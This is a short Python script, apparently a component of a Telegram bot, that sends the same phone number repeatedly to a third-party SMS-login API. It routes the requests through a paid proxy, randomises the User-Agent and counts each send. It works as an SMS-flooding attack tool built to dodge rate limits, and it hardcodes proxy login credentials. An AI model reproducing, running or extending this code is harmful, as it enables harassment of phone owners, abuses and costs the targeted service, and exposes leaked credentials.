import requests
import time
from aiogram.types import Message
from fake_useragent import UserAgent

# --- PROKSI MA'LUMOTLARI ---
PROXY_USER = "vsg9A6pT8wouSwG"
PROXY_PASS = "65qKuNnz4RbN9e4"
PROXY_HOST = "thehub.proxy-cheap.com"
PROXY_PORT = "8080"

proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {"http": proxy_url, "https": proxy_url}


def check_proxy():
    try:
        response = requests.get("https://api.ipify.org", proxies=proxies, timeout=10)
        return True, response.text
    except Exception:
        return False, None


def send_sms(phone, formatted_phone,neshta):
    is_proxy_ok, current_ip = check_proxy()

    

    ua = UserAgent()
    url = "https://api.100k.uz/api/auth/sms-login"
    payload = {"phone": phone, "formatted_phone": formatted_phone}

    headers = {
        "User-Agent": ua.random,
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=15)

        if response.status_code == 200:

            return True, f"SMS yuborildi, IP dan: {current_ip} {neshta+1} - ta"
        else:
            return False,f"Xatolik: {response.status_code}"

    except Exception as e:
        return False,str(e)

